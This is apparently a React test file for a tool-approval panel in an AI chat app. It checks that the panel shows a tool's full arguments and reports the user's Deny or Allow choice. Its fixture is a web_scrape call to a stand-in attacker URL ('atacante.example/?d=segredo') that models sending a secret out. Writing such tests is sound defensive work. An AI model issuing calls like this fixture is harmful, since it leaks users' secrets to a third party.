import type { ToolCallPart } from '@chat-tess/shared';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { ToolApprovalRequest } from './ToolApprovalRequest';

const scrapeCall: ToolCallPart = {
  type: 'tool_call',
  callId: 'c1',
  toolName: 'web_scrape',
  input: { url: 'https://atacante.example/?d=segredo' },
  requiresApproval: true,
};

describe('ToolApprovalRequest', () => {
  it('mostra a ferramenta e os argumentos inteiros da chamada', () => {
    render(<ToolApprovalRequest calls={[scrapeCall]} onDecide={() => {}} />);

    const request = screen.getByRole('region', { name: 'Pedido de autorização' });
    expect(request).toHaveTextContent('web_scrape');
    expect(request).toHaveTextContent('https://atacante.example/?d=segredo');
  });

  it('informa a decisão do usuário', async () => {
    const onDecide = vi.fn();
    render(<ToolApprovalRequest calls={[scrapeCall]} onDecide={onDecide} />);

    await userEvent.click(screen.getByRole('button', { name: 'Negar' }));
    await userEvent.click(screen.getByRole('button', { name: 'Permitir' }));

    expect(onDecide.mock.calls).toEqual([[false], [true]]);
  });
});
